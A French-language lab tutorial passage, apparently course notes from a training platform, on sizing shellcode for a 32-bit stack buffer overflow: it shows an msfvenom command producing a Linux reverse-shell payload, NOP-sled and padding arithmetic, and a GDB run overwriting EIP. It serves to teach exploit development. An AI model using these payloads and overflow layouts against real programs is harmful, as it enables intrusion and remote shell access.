# Determine the Length for Shellcode

Nous devons maintenant découvrir combien d’espace nous avons pour notre shellcode afin d’exécuter l’action souhaitée.\
Il est courant et utile d’exploiter une telle vulnérabilité pour obtenir un **reverse shell**.

Tout d’abord, nous devons estimer la taille de notre shellcode que nous allons insérer. Pour cela, nous utiliserons **msfvenom**.

***

#### <mark style="color:green;">**Shellcode — Longueur**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot_1@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 --platform linux --arch x86 --format c
```
{% endcode %}

Sortie :

```
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

Nous savons donc que notre **payload** fera environ **68 octets**.\
Par précaution, nous devrions prévoir une marge plus grande si le shellcode devait augmenter à cause de paramètres supplémentaires.

***

#### <mark style="color:green;">**NOP Sled**</mark>

Il est souvent utile d’insérer des instructions **NOP (No Operation, \x90)** avant que le shellcode ne démarre, afin qu’il puisse s’exécuter proprement.

Résumé de ce dont nous avons besoin :

* Nous devons atteindre **1040 octets** pour écraser l’EIP.
* Nous ajoutons **100 octets de NOPs**.
* Nous prévoyons **150 octets pour le shellcode**.

***

#### <mark style="color:green;">**Calcul du buffer**</mark>

```
Buffer   = "\x55" * (1040 - 100 - 150 - 4) = 786 octets
NOPs     = "\x90" * 100
Shellcode= "\x44" * 150
EIP      = "\x66" * 4
```

***

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">**GDB (Debugging)**</mark>

Testons avec GDB :

{% code fullWidth="true" %}
```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```
{% endcode %}

Sortie :

{% code fullWidth="true" %}
```nasm
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```
{% endcode %}

***

#### <mark style="color:green;">Résumé mémoire (diagramme)</mark>

{% code fullWidth="true" %}
```
[ Buffer 786 octets ] → [ NOPs 100 octets ] → [ Shellcode 150 octets ] → [ EIP 4 octets ]
```
{% endcode %}

***

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**🔹 Exemple d’un NOP sled**</mark>

Imagine qu’on construit notre buffer comme ça :

```
[ 786 * 'A' ] + [ 100 * NOP ] + [ Shellcode 150 bytes ] + [ EIP overwrite ]
```

ASCII schéma :

```
+-------------------------------------------------------------+
| Padding (A) |   NOP NOP NOP NOP NOP ...   |  Shellcode  | EIP|
+-------------------------------------------------------------+
```

* **EIP** va pointer **quelque part au hasard dans la zone des NOPs**.
* Comme un NOP ne fait rien, le CPU va "glisser" (`sled`) jusqu’à tomber naturellement sur le début du shellcode.
